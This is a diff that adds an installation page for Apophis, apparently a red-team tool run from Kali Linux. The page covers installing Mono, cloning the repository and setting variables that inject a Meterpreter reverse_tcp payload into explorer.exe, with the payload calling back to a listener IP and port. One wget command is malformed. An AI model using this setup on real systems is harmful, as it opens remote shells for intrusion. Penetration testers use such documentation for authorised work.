@@ -1,0 +1,45 @@
+---
+title: "Installation"
+description: "Install Apophis and its dependencies on Kali Linux."
+icon: "download"
+---
+
+## Install Mono
+
+```bash
+sudo apt-get install mono-complete
+```
+
+If your Linux host can't resolve the IP address:
+
+```bash
+wget -q -O https://archive.kali.org/archive-key.asc | sudo apt-key add
+sudo apt update
+sudo apt-get install mono-complete
+```
+
+## Clone and Run
+
+```bash
+git clone https://github.com/tasox/Apophis
+chmod +x apophis.sh
+./apophis.sh
+```
+
+## Configure Static Variables
+
+Open `apophis.sh` and set these variables before running:
+
+| Variable | Description |
+|----------|-------------|
+| `PROCESS_TO_INJECT` | Remote process name to inject into |
+| `MSFVENOM_PAYLOAD` | MSF payload |
+| `LHOST` | Listener IP |
+| `LPORT` | Listener port |
+
+```bash
+PROCESS_TO_INJECT="explorer"
+MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
+LHOST="192.168.100.128"
+LPORT=443
+```
